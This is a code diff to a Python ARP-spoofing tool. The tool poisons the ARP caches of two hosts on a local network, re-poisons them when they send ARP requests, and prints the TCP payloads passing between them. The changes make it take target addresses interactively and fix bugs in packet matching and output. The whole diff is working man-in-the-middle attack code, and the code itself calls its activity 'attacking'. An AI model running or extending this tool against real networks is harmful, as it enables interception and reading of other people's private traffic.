@@ -15,8 +15,8 @@ def get_mac(ip):
     return pack('!6B', *[int(x, 16) for x in mac.split(':')])
 
 # Prompts for host IP's
-ip1_unpacked = "192.168.1.100"#input("Host1's IP: ")
-ip2_unpacked = "192.168.1.101"#input("Host2's IP: ")
+ip1_unpacked = input("Host1's IP: ")
+ip2_unpacked = input("Host2's IP: ")
 ip1 = pack('!4B', *[int(x) for x in ip1_unpacked.split('.')])
 ip2 = pack('!4B', *[int(x) for x in ip2_unpacked.split('.')])
 
@@ -26,8 +26,8 @@ mac2 = get_mac(ip2_unpacked)
 
 # Sets up socket to send ARP reply
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-#print(os.system('ifconfig'))
-net_device = "enp0s3"#input("Select network device: ")
+print(os.system('ifconfig'))
+net_device = input("Select network device: ")
 s.bind((net_device, socket.SOCK_RAW))
 
 # This computers mac address
@@ -69,6 +69,7 @@ def restore_connection():
     arp2 = make_arp(ip2, mac2, ip1, mac1)
     s.send(arp1)
     s.send(arp2)
+    s.close()
 
 # Boolean to determine when to stop attacking
 attacking = True
@@ -95,11 +96,11 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
             arp_header = packet[ethernet_length:ethernet_length+28]
             arp_unpacked = unpack('>HHBBH6s4s6s4s', arp_header)
             opcode = arp_unpacked[4]
-            sender_ip = arp_unpacked[6]
-
-            if opcode == 0x0001 and sender_ip == Host_One_IP:
+            sender_ip = socket.inet_ntoa(arp_unpacked[6])
+            target_ip = socket.inet_ntoa(arp_unpacked[8])
+            if opcode == 0x0001 and sender_ip == Host_One_IP and target_ip == Host_Two_IP:
                 s.send(arp1)
-            elif opcode == 0x0001 and sender_ip == Host_Two_IP:
+            elif opcode == 0x0001 and sender_ip == Host_Two_IP and target_ip == Host_One_IP:
                 s.send(arp2)
         else:
             ip_header = packet[ethernet_length:ethernet_length+20]
@@ -155,10 +156,10 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
 
             header_size = ethAndIP_len + tcp_header_length
 
-            data = packet[header_size:]
-
-            if len(data) > 0 and (srcIP == Host_One_IP and dstIP == Host_Two_IP) or (dstIP == Host_One_IP and srcIP == Host_Two_IP):
-                print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))
+            data = packet[header_size+2:]
+            if len(data) > 0 and ((srcIP == Host_One_IP and dstIP == Host_Two_IP) or (dstIP == Host_One_IP and srcIP == Host_Two_IP)):
+                data_string = str(data)
+                print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + data_string[2:len(data_string)-1])
 
 # Starts the packet sniffer thread
 def start_sniffer():
